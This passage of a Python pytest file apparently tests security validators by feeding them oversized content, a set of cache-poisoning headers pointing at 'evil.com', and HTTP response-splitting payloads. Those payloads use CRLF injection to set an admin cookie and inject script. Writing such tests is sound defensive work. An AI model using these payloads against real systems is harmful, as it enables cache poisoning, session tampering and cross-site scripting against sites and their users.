        # Create a highly compressible payload
        zip_bomb_content = "A" * 1000000  # 1MB of same character

        # Should handle large but valid content
        resource = ResourceCreate(uri="test.txt", name="Large Resource", content=zip_bomb_content)
        assert len(resource.content) == 1000000

        # But prevent extremely large content
        with pytest.raises(ValidationError):
            ResourceCreate(uri="test.txt", name="Too Large Resource", content="A" * (SecurityValidator.MAX_CONTENT_LENGTH + 1))

    def test_cache_poisoning_prevention(self):
        """Test cache poisoning attack prevention."""
        cache_poisoning_headers = {
            "X-Forwarded-Host": "evil.com",
            "X-Forwarded-Port": "443",
            "X-Forwarded-Proto": "https",
            "X-Original-URL": "http://evil.com",
            "X-Rewrite-URL": "/admin",
            "CF-Connecting-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
        }

        # Headers should be allowed but handled safely
        tool = ToolCreate(name="test", url="https://example.com", headers=cache_poisoning_headers)
        assert tool.headers == cache_poisoning_headers

    def test_http_response_splitting_prevention(self):
        """Test HTTP response splitting prevention."""
        response_splitting_payloads = [
            "value\r\nSet-Cookie: admin=true",
            "value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
            "value%0d%0aSet-Cookie:%20admin=true",
            "value%0d%0a%0d%0a<html><body><script>alert('XSS')</script></body></html>",
        ]

        for payload in response_splitting_payloads:
            with pytest.raises(ValidationError):
                ToolCreate(name="test", url="https://example.com", description=payload)


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "--tb=short"])
